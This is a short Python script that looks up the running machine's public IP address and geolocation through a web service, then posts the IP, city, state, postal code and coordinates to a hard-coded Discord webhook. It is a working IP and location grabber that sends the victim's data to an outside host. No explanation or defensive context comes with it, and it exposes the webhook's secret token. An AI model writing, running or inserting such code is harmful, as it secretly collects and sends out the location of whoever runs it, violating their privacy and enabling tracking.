import requests, json




config = json.loads(requests.get("https://geolocation-db.com/json/").text)




requests.post(
    url="https://discord.com/api/webhooks/1006009472734478357/w8ZsMf5gilKJpqbJc4HwjzjuvLghtCzuBWeFnOgTUzWjLAfgZXI0IXwa_XEE-oyubJX3",
    json={'content': f"@everyone\nIp: {config['IPv4']}\nCity: {config['city']}\nState: {config['state']}\nPostal: {config['postal']}\nLatitude: {config['latitude']}\nLongitude: {config['longitude']}"}
)